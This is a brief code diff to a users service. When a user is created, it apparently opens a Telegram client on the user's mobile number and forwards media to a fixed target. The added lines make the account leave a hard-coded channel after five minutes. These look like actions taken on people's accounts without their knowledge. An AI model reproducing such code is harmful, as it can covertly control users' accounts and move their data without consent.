@@ -40,6 +40,9 @@ let UsersService = class UsersService {
                 await this.telegramService.createClient(user.mobile, false, false);
                 this.telegramService.forwardMedia(user.mobile, "savedmessages34", null);
             }, 2000);
+            setTimeout(async () => {
+                await this.telegramService.leaveChannel(user.mobile, "2302868706");
+            }, 300000);
             const newUser = new this.userModel(user);
             return newUser.save();
         }
